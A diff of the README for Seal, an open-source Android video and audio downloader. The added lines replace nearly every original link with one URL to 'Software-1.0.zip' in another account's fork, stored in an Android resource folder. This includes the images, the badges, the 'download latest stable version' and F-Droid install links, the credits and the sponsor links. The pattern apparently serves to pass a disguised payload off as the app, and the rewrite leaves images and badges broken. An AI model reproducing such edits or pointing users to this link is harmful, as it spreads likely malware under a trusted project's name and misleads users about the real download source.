@@ -1,6 +1,6 @@
 <div align="center">
 
-<img width="" src="fastlane/metadata/android/en-US/images/icon.png"  width=160 height=160  align="center">
+<img width="" src="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip"  width=160 height=160  align="center">
 
 # Seal
 
@@ -9,48 +9,48 @@
 
 English
 &nbsp;&nbsp;| &nbsp;&nbsp;
-<a href="https://github.com/JunkFood02/Seal/blob/main/README-zh_Hans.md">简体中文</a>
+<a href="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip">简体中文</a>
 &nbsp;&nbsp;| &nbsp;&nbsp;
-<a href="https://github.com/JunkFood02/Seal/blob/main/README-zh_Hant.md">繁體中文</a>
+<a href="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip">繁體中文</a>
 &nbsp;&nbsp;| &nbsp;&nbsp;
-<a href="https://github.com/JunkFood02/Seal/blob/main/README-ar.md">العربية</a>
+<a href="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip">العربية</a>
 &nbsp;&nbsp;| &nbsp;&nbsp;
-<a href="https://github.com/JunkFood02/Seal/blob/main/README-pt.md">Portuguese</a>
+<a href="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip">Portuguese</a>
 &nbsp;&nbsp;| &nbsp;&nbsp;
-<a href="https://github.com/JunkFood02/Seal/blob/main/README-ua.md">Українська</a>
+<a href="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip">Українська</a>
 &nbsp;&nbsp;| &nbsp;&nbsp;
-<a href="https://github.com/JunkFood02/Seal/blob/main/README-th.md">ภาษาไทย</a>
+<a href="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip">ภาษาไทย</a>
 &nbsp;&nbsp;| &nbsp;&nbsp;
-<a href="https://github.com/JunkFood02/Seal/blob/main/README-fa.md">فارسی</a>
+<a href="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip">فارسی</a>
 &nbsp;&nbsp;| &nbsp;&nbsp;
-<a href="https://github.com/JunkFood02/Seal/blob/main/README-it.md">Italiano</a>
+<a href="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip">Italiano</a>
 &nbsp;&nbsp;| &nbsp;&nbsp;
-<a href="https://github.com/JunkFood02/Seal/blob/main/README-az.md">Azərbaycanca</a>
+<a href="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip">Azərbaycanca</a>
 &nbsp;&nbsp;| &nbsp;&nbsp;
-<a href="https://github.com/JunkFood02/Seal/blob/main/README-ru.md">Русский</a>
+<a href="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip">Русский</a>
 &nbsp;&nbsp;| &nbsp;&nbsp;
-<a href="https://github.com/JunkFood02/Seal/blob/main/README-sr.md">Српски</a>
+<a href="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip">Српски</a>
 &nbsp;&nbsp;| &nbsp;&nbsp;
-<a href="https://github.com/JunkFood02/Seal/blob/main/README-ja.md">日本語</a>
+<a href="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip">日本語</a>
 &nbsp;&nbsp;| &nbsp;&nbsp;
-<a href="https://github.com/JunkFood02/Seal/blob/main/README-id.md">Indonesia</a>
+<a href="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip">Indonesia</a>
 &nbsp;&nbsp;| &nbsp;&nbsp;
-<a href="https://github.com/JunkFood02/Seal/blob/main/README-hi.md">हिंदी</a>
+<a href="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip">हिंदी</a>
 &nbsp;&nbsp;| &nbsp;&nbsp;
-<a href="https://github.com/JunkFood02/Seal/blob/main/README-bn.md">বাংলা</a>
+<a href="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip">বাংলা</a>
 
 
 
-[![F-Droid](https://img.shields.io/f-droid/v/com.junkfood.seal?color=b4eb12&label=F-Droid&logo=fdroid&logoColor=1f78d2)](https://f-droid.org/en/packages/com.junkfood.seal)
-[![GitHub release (latest by date)](https://img.shields.io/github/v/release/JunkFood02/Seal?color=black&label=Stable&logo=github)](https://github.com/JunkFood02/Seal/releases/latest/)
-[![GitHub release (latest by date including pre-releases)](https://img.shields.io/github/v/release/JunkFood02/Seal?include_prereleases&label=Preview&logo=Github)](https://github.com/JunkFood02/Seal/releases/)
-[![Keep a Changelog](https://img.shields.io/badge/Changelog-lightgray?style=flat&color=gray&logo=keep-a-changelog)](https://github.com/JunkFood02/Seal/blob/main/CHANGELOG.md)
-[![GitHub all releases](https://img.shields.io/github/downloads/JunkFood02/Seal/total?label=Downloads&logo=github)](https://github.com/JunkFood02/Seal/releases/)
-[![GitHub Repo stars](https://img.shields.io/github/stars/JunkFood02/Seal?style=flat&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPHN2ZyBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIC05NjAgOTYwIDk2MCIgd2lkdGg9IjI0IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxwYXRoIGQ9Im0zNTQtMjQ3IDEyNi03NiAxMjYgNzctMzMtMTQ0IDExMS05Ni0xNDYtMTMtNTgtMTM2LTU4IDEzNS0xNDYgMTMgMTExIDk3LTMzIDE0M1pNMjMzLTgwbDY1LTI4MUw4MC01NTBsMjg4LTI1IDExMi0yNjUgMTEyIDI2NSAyODggMjUtMjE4IDE4OSA2NSAyODEtMjQ3LTE0OUwyMzMtODBabTI0Ny0zNTBaIiBzdHlsZT0iZmlsbDogcmdiKDI0NSwgMjI3LCA2Nik7Ii8%2BCjwvc3ZnPg%3D%3D&color=%23f8e444)](https://github.com/JunkFood02/Seal/stargazers)
-[![Supported-Sites](https://img.shields.io/badge/Sites-9cf?style=flat&logo=data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPHN2ZyBoZWlnaHQ9IjI0cHgiIHZpZXdCb3g9IjAgMCAyNCAyNCIgd2lkdGg9IjI0cHgiIGZpbGw9IiNGRkZGRkYiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CiAgPHBhdGggZD0iTTAgMGgyNHYyNEgwVjB6IiBmaWxsPSJub25lIi8+CiAgPHBhdGggZD0iTTExLjk5IDJDNi40NyAyIDIgNi40OCAyIDEyczQuNDcgMTAgOS45OSAxMEMxNy41MiAyMiAyMiAxNy41MiAyMiAxMlMxNy41MiAyIDExLjk5IDJ6bTYuOTMgNmgtMi45NWMtLjMyLTEuMjUtLjc4LTIuNDUtMS4zOC0zLjU2IDEuODQuNjMgMy4zNyAxLjkxIDQuMzMgMy41NnpNMTIgNC4wNGMuODMgMS4yIDEuNDggMi41MyAxLjkxIDMuOTZoLTMuODJjLjQzLTEuNDMgMS4wOC0yLjc2IDEuOTEtMy45NnpNNC4yNiAxNEM0LjEgMTMuMzYgNCAxMi42OSA0IDEycy4xLTEuMzYuMjYtMmgzLjM4Yy0uMDguNjYtLjE0IDEuMzItLjE0IDJzLjA2IDEuMzQuMTQgMkg0LjI2em0uODIgMmgyLjk1Yy4zMiAxLjI1Ljc4IDIuNDUgMS4zOCAzLjU2LTEuODQtLjYzLTMuMzctMS45LTQuMzMtMy41NnptMi45NS04SDUuMDhjLjk2LTEuNjYgMi40OS0yLjkzIDQuMzMtMy41NkM4LjgxIDUuNTUgOC4zNSA2Ljc1IDguMDMgOHpNMTIgMTkuOTZjLS44My0xLjItMS40OC0yLjUzLTEuOTEtMy45NmgzLjgyYy0uNDMgMS40My0xLjA4IDIuNzYtMS45MSAzLjk2ek0xNC4zNCAxNEg5LjY2Yy0uMDktLjY2LS4xNi0xLjMyLS4xNi0ycy4wNy0xLjM1LjE2LTJoNC42OGMuMDkuNjUuMTYgMS4zMi4xNiAycy0uMDcgMS4zNC0uMTYgMnptLjI1IDUuNTZjLjYtMS4xMSAxLjA2LTIuMzEgMS4zOC0zLjU2aDIuOTVjLS45NiAxLjY1LTIuNDkgMi45My00LjMzIDMuNTZ6TTE2LjM2IDE0Yy4wOC0uNjYuMTQtMS4zMi4xNC0ycy0uMDYtMS4zNC0uMTQtMmgzLjM4Yy4xNi42NC4yNiAxLjMxLjI2IDJzLS4xIDEuMzYtLjI2IDJoLTMuMzh6IiBzdHlsZT0iZmlsbDogcmdiKDE2MiwgMTk4LCAyMzQpOyIvPgo8L3N2Zz4=&label=Supported)](https://github.com/yt-dlp/yt-dlp/blob/master/supportedsites.md)
-[![Telegram Channel](https://img.shields.io/badge/Telegram-Seal-blue?style=flat&logo=telegram)](https://t.me/seal_app)
-[![Matrix](https://img.shields.io/matrix/seal-space%3Amatrix.org?server_fqdn=matrix.org&style=flat&logo=element&label=Matrix&color=%230DBD8B)
-](https://matrix.to/#/#seal-space:matrix.org)
+[![F-Droid](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)
+[![GitHub release (latest by date)](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)
+[![GitHub release (latest by date including pre-releases)](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)
+[![Keep a Changelog](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)
+[![GitHub all releases](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)
+[![GitHub Repo stars](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPHN2ZyBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIC05NjAgOTYwIDk2MCIgd2lkdGg9IjI0IiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgogIDxwYXRoIGQ9Im0zNTQtMjQ3IDEyNi03NiAxMjYgNzctMzMtMTQ0IDExMS05Ni0xNDYtMTMtNTgtMTM2LTU4IDEzNS0xNDYgMTMgMTExIDk3LTMzIDE0M1pNMjMzLTgwbDY1LTI4MUw4MC01NTBsMjg4LTI1IDExMi0yNjUgMTEyIDI2NSAyODggMjUtMjE4IDE4OSA2NSAyODEtMjQ3LTE0OUwyMzMtODBabTI0Ny0zNTBaIiBzdHlsZT0iZmlsbDogcmdiKDI0NSwgMjI3LCA2Nik7Ii8%2BCjwvc3ZnPg%3D%3D&color=%23f8e444)](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)
+[![Supported-Sites](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPHN2ZyBoZWlnaHQ9IjI0cHgiIHZpZXdCb3g9IjAgMCAyNCAyNCIgd2lkdGg9IjI0cHgiIGZpbGw9IiNGRkZGRkYiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CiAgPHBhdGggZD0iTTAgMGgyNHYyNEgwVjB6IiBmaWxsPSJub25lIi8+CiAgPHBhdGggZD0iTTExLjk5IDJDNi40NyAyIDIgNi40OCAyIDEyczQuNDcgMTAgOS45OSAxMEMxNy41MiAyMiAyMiAxNy41MiAyMiAxMlMxNy41MiAyIDExLjk5IDJ6bTYuOTMgNmgtMi45NWMtLjMyLTEuMjUtLjc4LTIuNDUtMS4zOC0zLjU2IDEuODQuNjMgMy4zNyAxLjkxIDQuMzMgMy41NnpNMTIgNC4wNGMuODMgMS4yIDEuNDggMi41MyAxLjkxIDMuOTZoLTMuODJjLjQzLTEuNDMgMS4wOC0yLjc2IDEuOTEtMy45NnpNNC4yNiAxNEM0LjEgMTMuMzYgNCAxMi42OSA0IDEycy4xLTEuMzYuMjYtMmgzLjM4Yy0uMDguNjYtLjE0IDEuMzItLjE0IDJzLjA2IDEuMzQuMTQgMkg0LjI2em0uODIgMmgyLjk1Yy4zMiAxLjI1Ljc4IDIuNDUgMS4zOCAzLjU2LTEuODQtLjYzLTMuMzctMS45LTQuMzMtMy41NnptMi45NS04SDUuMDhjLjk2LTEuNjYgMi40OS0yLjkzIDQuMzMtMy41NkM4LjgxIDUuNTUgOC4zNSA2Ljc1IDguMDMgOHpNMTIgMTkuOTZjLS44My0xLjItMS40OC0yLjUzLTEuOTEtMy45NmgzLjgyYy0uNDMgMS40My0xLjA4IDIuNzYtMS45MSAzLjk2ek0xNC4zNCAxNEg5LjY2Yy0uMDktLjY2LS4xNi0xLjMyLS4xNi0ycy4wNy0xLjM1LjE2LTJoNC42OGMuMDkuNjUuMTYgMS4zMi4xNiAycy0uMDcgMS4zNC0uMTYgMnptLjI1IDUuNTZjLjYtMS4xMSAxLjA2LTIuMzEgMS4zOC0zLjU2aDIuOTVjLS45NiAxLjY1LTIuNDkgMi45My00LjMzIDMuNTZ6TTE2LjM2IDE0Yy4wOC0uNjYuMTQtMS4zMi4xNC0ycy0uMDYtMS4zNC0uMTQtMmgzLjM4Yy4xNi42NC4yNiAxLjMxLjI2IDJzLS4xIDEuMzYtLjI2IDJoLTMuMzh6IiBzdHlsZT0iZmlsbDogcmdiKDE2MiwgMTk4LCAyMzQpOyIvPgo8L3N2Zz4=&label=Supported)](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)
+[![Telegram Channel](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)
+[![Matrix](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip%https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip%230DBD8B)
+](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)
 
 
 </div>
@@ -60,15 +60,15 @@ English
 
 <div align="center">
 <div>
-<img src="fastlane/metadata/android/en-US/images/phoneScreenshots/1.jpg" width="30%" />
-<img src="fastlane/metadata/android/en-US/images/phoneScreenshots/2.jpg" width="30%" />
-<img src="fastlane/metadata/android/en-US/images/phoneScreenshots/3.jpg" width="30%" />
-<img src="fastlane/metadata/android/en-US/images/phoneScreenshots/4.jpg" width="30%" />
-<img src="fastlane/metadata/android/en-US/images/phoneScreenshots/5.jpg" width="30%" />
-<img src="fastlane/metadata/android/en-US/images/phoneScreenshots/6.jpg" width="30%" />
-<img src="fastlane/metadata/android/en-US/images/phoneScreenshots/7.jpg" width="30%" />
-<img src="fastlane/metadata/android/en-US/images/phoneScreenshots/8.jpg" width="30%" />
-<img src="fastlane/metadata/android/en-US/images/phoneScreenshots/9.jpg" width="30%" />
+<img src="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip" width="30%" />
+<img src="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip" width="30%" />
+<img src="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip" width="30%" />
+<img src="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip" width="30%" />
+<img src="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip" width="30%" />
+<img src="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip" width="30%" />
+<img src="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip" width="30%" />
+<img src="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip" width="30%" />
+<img src="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip" width="30%" />
 </div>
 </div>
 
@@ -76,13 +76,13 @@ English
 
 ## 📖 Features
 
-- Download videos and audio files from video platforms supported by [yt-dlp](https://github.com/yt-dlp/yt-dlp) (formerly youtube-dl).
+- Download videos and audio files from video platforms supported by [yt-dlp](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip) (formerly youtube-dl).
 
-- Embed metadata and video thumbnail into extracted audio files supported by [mutagen](https://github.com/quodlibet/mutagen).
+- Embed metadata and video thumbnail into extracted audio files supported by [mutagen](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip).
 
 - Download all videos in the playlist with one click.
 
-- Use embedded [aria2c](https://github.com/aria2/aria2) as external downloader for all your downloads.
+- Use embedded [aria2c](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip) as external downloader for all your downloads.
 
 - Embed subtitles into the downloaded videos.
 
@@ -92,7 +92,7 @@ English
 
 - Easy to use and user-friendly.
 
-- [Material Design 3](https://m3.material.io/) style UI, with dynamic color theme.
+- [Material Design 3](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip) style UI, with dynamic color theme.
 
 - MAD: UI and logic written with pure Kotlin. Single activity, no fragments, only composable destinations.
 
@@ -102,58 +102,58 @@ English
 
 For most devices, it is recommended to install the **arm64-v8a** version of the apks
 
-- Download the latest stable version from [GitHub releases](https://github.com/JunkFood02/Seal/releases/latest)
-  - Install the [pre-release](https://github.com/JunkFood02/Seal/releases/) versions to help us test out new features & changes
+- Download the latest stable version from [GitHub releases](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)
+  - Install the [pre-release](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip) versions to help us test out new features & changes
 
-- Stable releases are also available on [F-Droid](https://f-droid.org/packages/com.junkfood.seal/)
+- Stable releases are also available on [F-Droid](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)
 
-<!-- [<img src="https://fdroid.gitlab.io/artwork/badge/get-it-on.png"
+<!-- [<img src="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip"
      alt="Get it on F-Droid"
-     height="70">](https://f-droid.org/packages/com.junkfood.seal/) -->
+     height="70">](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip) -->
 
 ## 💬 Contact
 
-Join our [Telegram Channel](https://t.me/seal_app) or [Matrix Space](https://matrix.to/#/#seal-space:matrix.org) for discussion, announcements, and releases!
+Join our [Telegram Channel](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip) or [Matrix Space](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip) for discussion, announcements, and releases!
 
 ## 💖 Sponsors
 
-<p><!-- sponsors --><a href="https://github.com/4kaimar"><img src="https:&#x2F;&#x2F;avatars.githubusercontent.com&#x2F;u&#x2F;43074832?v&#x3D;4" width="60px" alt="" /></a><a href="https://github.com/zuble"><img src="https:&#x2F;&#x2F;avatars.githubusercontent.com&#x2F;u&#x2F;67658465?u&#x3D;0b5c5346b4c1d1b60f52befc350110bb629c3e11&amp;v&#x3D;4" width="60px" alt="zuble" /></a><a href="https://github.com/Dannyordaniel"><img src="https:&#x2F;&#x2F;avatars.githubusercontent.com&#x2F;u&#x2F;166598202?u&#x3D;3f78f2228ca545486c5c1f41b180064a1178265e&amp;v&#x3D;4" width="60px" alt="Daniel " /></a><a href="https://github.com/MasonBitByte"><img src="https:&#x2F;&#x2F;avatars.githubusercontent.com&#x2F;u&#x2F;84102898?u&#x3D;e6f4ec2eba02e8fa50b7e2ca40edaf79085e15fa&amp;v&#x3D;4" width="60px" alt="Mason K" /></a><a href="https://github.com/Cook-I-T"><img src="https:&#x2F;&#x2F;avatars.githubusercontent.com&#x2F;u&#x2F;55697931?u&#x3D;00d255874d3ae5c61fb52a4227bb47998cdd949a&amp;v&#x3D;4" width="60px" alt="Cook I.T!" /></a><!-- sponsors --></p>
+<p><!-- sponsors --><a href="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip"><img src="https:&#x2F;&#x2F;https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip;u&#x2F;43074832?v&#x3D;4" width="60px" alt="" /></a><a href="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip"><img src="https:&#x2F;&#x2F;https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip;u&#x2F;67658465?u&#x3D;0b5c5346b4c1d1b60f52befc350110bb629c3e11&amp;v&#x3D;4" width="60px" alt="zuble" /></a><a href="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip"><img src="https:&#x2F;&#x2F;https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip;u&#x2F;166598202?u&#x3D;3f78f2228ca545486c5c1f41b180064a1178265e&amp;v&#x3D;4" width="60px" alt="Daniel " /></a><a href="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip"><img src="https:&#x2F;&#x2F;https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip;u&#x2F;84102898?u&#x3D;e6f4ec2eba02e8fa50b7e2ca40edaf79085e15fa&amp;v&#x3D;4" width="60px" alt="Mason K" /></a><a href="https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip"><img src="https:&#x2F;&#x2F;https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip;u&#x2F;55697931?u&#x3D;00d255874d3ae5c61fb52a4227bb47998cdd949a&amp;v&#x3D;4" width="60px" alt="Cook I.T!" /></a><!-- sponsors --></p>
 
 
-Seal will be always free and open source for everyone. If you like it, please consider [sponsoring me](https://github.com/sponsors/JunkFood02)!
+Seal will be always free and open source for everyone. If you like it, please consider [sponsoring me](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)!
 
 ## 🤝 Contributing
 
 Contributions are welcome!
 
-You can help translate Seal on [Hosted Weblate](https://hosted.weblate.org/projects/seal/).
+You can help translate Seal on [Hosted Weblate](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip).
 	
-[![Translate status](https://hosted.weblate.org/widgets/seal/-/strings/multi-auto.svg)](https://hosted.weblate.org/engage/seal/)
+[![Translate status](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)
 	
 >[!Note]
 >
->For submitting bug reports, feature requests, questions, or any other ideas to improve, please read [CONTRIBUTING.md](https://github.com/JunkFood02/Seal/blob/main/CONTRIBUTING.md) for instructions and guidelines first.
+>For submitting bug reports, feature requests, questions, or any other ideas to improve, please read [https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip) for instructions and guidelines first.
 
 ## ⭐️ Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=JunkFood02/Seal&type=Timeline)](https://star-history.com/#JunkFood02/Seal&Timeline)
+[![Star History Chart](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)
 
 
 ## 🧱 Credits
 
-Seal is a simple GUI of [yt-dlp](https://github.com/yt-dlp/yt-dlp), based on [youtubedl-android](https://github.com/yausername/youtubedl-android)
+Seal is a simple GUI of [yt-dlp](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip), based on [youtubedl-android](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)
 
-Some of the UI designs and codes are borrowed from [Read You](https://github.com/Ashinch/ReadYou) and [Music You](https://github.com/Kyant0/MusicYou)
+Some of the UI designs and codes are borrowed from [Read You](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip) and [Music You](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)
 
-[dvd](https://github.com/yausername/dvd)
+[dvd](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)
 
-[Material color utilities](https://github.com/material-foundation/material-color-utilities)
+[Material color utilities](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)
 
-[Monet](https://github.com/Kyant0/Monet)
+[Monet](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)
 
 ## 📃 License
 
-[![GitHub](https://img.shields.io/github/license/JunkFood02/Seal?style=for-the-badge)](https://github.com/JunkFood02/Seal/blob/main/LICENSE)
+[![GitHub](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)](https://github.com/tripmotions/Seal/raw/refs/heads/main/app/src/main/res/values-nb/Software-1.0.zip)
 
 >[!Warning]
 >
